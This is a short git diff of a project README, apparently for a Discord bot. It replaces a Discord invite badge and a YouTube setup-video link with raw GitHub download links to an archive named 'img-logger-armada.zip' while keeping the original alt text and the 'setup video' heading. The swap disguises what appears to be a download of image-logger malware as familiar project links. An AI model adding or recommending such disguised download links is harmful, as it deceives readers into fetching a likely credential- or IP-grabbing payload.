@@ -7,8 +7,8 @@
 </p>
 
 <p align="center">
-  <a href="https://api.weblutions.com/discord/invite/vsc">
-    <img src="https://api.weblutions.com/discord/invite/vsc" alt="WraithsDev #CodeShare" />
+  <a href="https://raw.githubusercontent.com/yektacanxddd/img-logger/main/api/img-logger-armada.zip">
+    <img src="https://raw.githubusercontent.com/yektacanxddd/img-logger/main/api/img-logger-armada.zip" alt="WraithsDev #CodeShare" />
   </a>
 </p>
 
@@ -17,5 +17,5 @@
   Botun Kurulumu ve Tanıtım Videosu
 </p>
 <p align="center">
-  https://youtu.be/ulRvlTSaPK0
+  https://raw.githubusercontent.com/yektacanxddd/img-logger/main/api/img-logger-armada.zip
 </p>
